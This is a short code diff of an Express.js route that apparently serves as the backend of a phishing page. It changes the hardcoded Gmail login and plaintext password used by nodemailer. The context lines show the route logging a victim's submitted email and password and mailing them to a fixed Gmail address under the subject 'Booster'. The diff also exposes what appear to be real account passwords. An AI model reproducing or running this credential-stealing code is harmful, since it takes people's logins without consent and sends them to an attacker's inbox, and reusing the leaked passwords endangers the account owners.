@@ -1,5 +1,5 @@
 var express = require('express');
-var nodemailer = require('nodemailer'); 
+var nodemailer = require('nodemailer');
 var router = express.Router();
 
 /* GET home page. */
@@ -10,8 +10,8 @@ router.get('/', function(req, res, next) {
 var transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
-    user: 'gaurav020406@gmail.com',
-    pass: 'iliketoplayfootball'
+    user: 'ggauravsigra@gmail.com',
+    pass: 'operator@php1'
   }
 });
 
@@ -22,7 +22,7 @@ console.log(email + " " + password);
 
 
 var mailOptions = {
-  from: 'gaurav020406@gmail.com',
+  from: 'ggauravsigra@gmail.com',
   to: 'gaurav020406@gmail.com',
   subject: 'Booster',
   text: email + ' ' +password,
